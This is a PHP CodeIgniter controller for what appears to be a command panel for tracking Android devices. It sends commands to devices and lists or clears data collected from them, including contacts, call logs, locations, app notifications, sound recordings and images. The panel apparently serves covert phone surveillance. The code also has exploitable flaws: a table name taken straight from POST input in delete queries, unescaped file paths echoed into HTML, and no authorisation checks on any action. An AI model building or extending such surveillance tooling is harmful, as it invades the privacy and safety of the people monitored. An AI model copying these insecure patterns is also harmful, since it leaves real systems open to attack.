<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Command extends CI_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->database();
        $this->load->library('session');
        $this->load->model('Command_model');
        $this->db->select("password");
        $this->db->where("user_type", "admin");
        $query = $this->db->get('admin_users');
        $this->curd = $this->load->model('Curd_model');

        $passwordq = $query->row();
        $this->gblpassword = $passwordq->password;
        $this->userdata = $this->session->userdata('logged_in');
    }

    public function setCommandFile($file_id) {

        $this->db->where("id", $file_id);
        $query = $this->db->get('track_command_file');
        $file_obj = $query->row_array();
        if ($file_obj) {
            $path = $file_obj["file_path"];
            $commandattr = json_encode(array("filepath" => $path, "file_id" => $file_id));
            $insertArray = array(
                "status" => "200",
                "device_id" => $file_obj["device_id"],
                "command" => "upload",
                "attr" => $commandattr,
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );
            $this->db->insert("track_active_command", $insertArray);
            redirect("Command/deviceDashboard/" . $file_obj["device_id"]);
        }
    }

    public function deviceDashboard($device_id) {
        $data = array();
        $commanddeletelist = [
            array(
                "title" => "Clear Sound Record",
                "command" => "track_command_file",
                "icon" => "fa fa-headphones"
            ),
            array(
                "title" => "Clear Contacts",
                "command" => "get_conects",
                "icon" => "fa fa-group"
            ),
            array(
                "title" => "Clear Contacts Log",
                "command" => "get_call_details",
                "icon" => "fa fa-phone"
            ),
            array(
                "title" => "Clear Images",
                "command" => "track_command_file",
                "icon" => "fa fa-photo"
            ),
            array(
                "title" => "Clear Locations",
                "command" => "get_location",
                "icon" => "fa fa-map-marker"
            ),
            array(
                "title" => "Clear Activities",
                "command" => "get_notifications",
                "icon" => "fa fa-bar-chart"
            ),
        ];

        $data["commanddeletelist"] = $commanddeletelist;

        $this->db->select("name, contact_no, brand, model_no, device_id");
        $this->db->where("device_id", $device_id);
        $query = $this->db->get('get_conects_person');
        $contactperson = $query->row_array();

        $notificationcount = $this->Command_model->appNotificationList($device_id);

        $command_list = $this->Command_model->currentCommand($device_id);

        $data["device_id"] = $device_id;
        $data['command_list'] = $command_list;
        $data['contactperson'] = $contactperson;
        $data['notificationdata'] = $notificationcount;

        if (isset($_POST["delete_data"])) {
            $commanddelete = $this->input->post("command");

            $this->db->where("device_id", $device_id);
            $this->db->delete("$commanddelete");
            redirect(site_url("Command/deviceDashboard/$device_id"));
        }


        if (isset($_POST["reset_all_command"])) {
            $this->db->where("device_id", $device_id);
            $this->db->delete("track_active_command");
            redirect(site_url("Command/deviceDashboard/$device_id"));
        }

        if (isset($_POST["delete_all_data"])) {
            foreach ($commanddeletelist as $key => $value) {
                $commanddeletetemp = $value["command"];

                $this->db->where("device_id", $device_id);
                $this->db->delete("$commanddeletetemp");
            }

            redirect(site_url("Command/deviceDashboard/$device_id"));
        }

        if (isset($_POST["send_command"])) {
            $command = $this->input->post("command");
            $timing = $this->input->post("timing");
            $attr = $this->input->post("attr");

            $this->db->where("device_id", $device_id);
//            $this->db->where("status!=", "100");
            $this->db->where("command", $command);
            $query = $this->db->get('track_active_command');
            $checkcommand = $query->row();
            $insertArray = array(
                "status" => "200",
                "device_id" => $device_id,
                "command" => $command,
                "attr" => json_encode(array("timing" => $timing, "attr" => $attr)),
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );
            switch ($timing) {
                case "bool":
                    if ($attr == "off") {
                        $insertArray["status"] = "100";
                    }
                    break;

                default:
                    echo "";
            }

            if ($checkcommand) {

                $this->db->where("device_id", $device_id);
//                $this->db->where("status", "200");
                $this->db->where("command", $command);
                $query = $this->db->update('track_active_command', $insertArray);
            } else {

                $this->db->insert("track_active_command", $insertArray);
            }
            redirect(site_url("Command/deviceDashboard/$device_id"));
        }

        $this->load->view('command/devicedashboard', $data);
    }

    function getFileData() {
//          $this->db->where("device_id", $device_id);
        $this->db->order_by("id desc");
        $query = $this->db->get('track_command_file');
        $listdata = $query->result_array();

        $headerarray = array("id" => "ID", "device_id" => "Device ID", "command" => "Command", "file_date_time" => "File Date/Time", "file_path" => "File Path", "date" => "Date", "time" => "Time");
        $data["headers"] = $headerarray;
        $data["page_title"] = "Requested Files Path";
        $data["result_data"] = $listdata;
        $this->load->view('command/filedatareport', $data);
    }

    function deleteFile($id) {
        $this->db->where("id", $id);
        $query = $this->db->delete('track_command_file');
        redirect(site_url("Command/getFileData"));
    }

    function listUploadFiles($device_id) {
        $this->db->where("device_id", $device_id);
        $this->db->where("upload_file_name!=", "");
        $query = $this->db->get("track_command_file");
        $allfiles = $query->result_array();
        echo "<table border=1>";
        foreach ($allfiles as $key => $value) {
            $uploadfile = base_url() . "assets/userfiles/" . $value["upload_file_name"];
            $filepath = $value["file_path"];
            echo "<tr><td>$device_id</td><td>$filepath</td><td><a target='_blank' href='$uploadfile'>$uploadfile</a></td></tr>";
        }

        echo "<table>";
    }

    function test() {
        $query = $this->db->get("temp_file");
        $allfiles = $query->result_array();
        foreach ($allfiles as $key => $value) {
            echo "<br/><br/><br/>";
            $decodedata = json_decode($value["filedata"]);
            print_r($decodedata);
        }
    }

    function appActivity($device_id, $package_name) {
        $this->db->where("device_id", $device_id);
        $this->db->where("package_name", $package_name);
        $this->db->set("seen", "yes");
        $this->db->update("get_notifications");

        $data = array();
        $this->db->select("name, contact_no, brand, model_no, device_id");
        $this->db->where("device_id", $device_id);
        $query = $this->db->get('get_conects_person');
        $contactperson = $query->row_array();


        $data["device_id"] = $device_id;
        $data["package_name"] = $package_name;
        $data['contactperson'] = $contactperson;

        $data['app_info'] = $this->Command_model->appTitle($package_name);


        $this->load->view('command/activitylist', $data);
    }

    function appFilesList($device_id, $command) {


        $data = array();
        $this->db->select("name, contact_no, brand, model_no, device_id");
        $this->db->where("device_id", $device_id);

        $query = $this->db->get('get_conects_person');
        $contactperson = $query->row_array();


        $data["device_id"] = $device_id;
        $data["command"] = $command;
        $data['contactperson'] = $contactperson;

        $app_info = array(
            "image" => base_url() . "assets/images/" . "defaultgallery.jpg",
            "title" => "Device Images",
            "description" => "If you want to see the image you have to download it first"
        );

        if ($command == 'sound_record') {
            $filetemp = base_url() . "assets/images/" . "sound.jpg";
            $app_info = array(
                "image" => $filetemp,
                "title" => "Device Recored Sound",
                "description" => "If you want to view the sounds, you have to download it first"
            );
        }
        $data["app_info"] = $app_info;



        $this->load->view('command/filelist', $data);
    }

    public function ApplicationSetting() {
        $data = array();

        $location_data = $this->Curd_model->get('android_apps');
        $location_select = array();


        $dependes = array(
            "location_data" => $location_select,
        );

        $data['depends'] = $dependes;

        $data['title'] = "Set Applications";
        $data['description'] = "";
        $data['form_title'] = "Add Apps";
        $data['table_name'] = 'android_apps';
        $form_attr = array(
            "title" => array("title" => "Title", "required" => false, "place_holder" => "", "type" => "textarea", "default" => ""),
            "image" => array("title" => "Image", "required" => false, "place_holder" => "", "type" => "textarea", "default" => ""),
            "package_name" => array("title" => "Package Name", "required" => true, "place_holder" => "", "type" => "textarea", "default" => ""),
            "playstore_url" => array("title" => "Play Store URL", "required" => false, "place_holder" => "", "type" => "textarea", "default" => ""),
        );

        if (isset($_POST['submitData'])) {
            $postarray = array();
            foreach ($form_attr as $key => $value) {
                $postarray[$key] = $this->input->post($key);
            }
            $this->Curd_model->insert('android_apps', $postarray);
            redirect("CMS/blogTag");
        }


        $this->db->select("id, image, title, package_name, playstore_url, image as imagesrc");
        $tag_data = $this->db->get('android_apps')->result_array();
        $data['list_data'] = $tag_data;

        $fields = array(
            "id" => array("title" => "ID#", "width" => "100px"),
            "imagesrc" => array("title" => "", "width" => "70px", "type" => "image",),
            "package_name" => array("title" => "Package Name", "width" => "20%", "type" => "readonly",),
            "title" => array("title" => "App Title", "width" => "100px", "type" => "textarea",),
            "image" => array("title" => "App Logo URL", "width" => "20%", "type" => "textarea",),
            "playstore_url" => array("title" => "Play Store URL", "width" => "20%", "type" => "textarea",),
        );

        $data['fields'] = $fields;
        $data['form_attr'] = $form_attr;
        $this->load->view('layout/curd', $data);
    }

}

?>
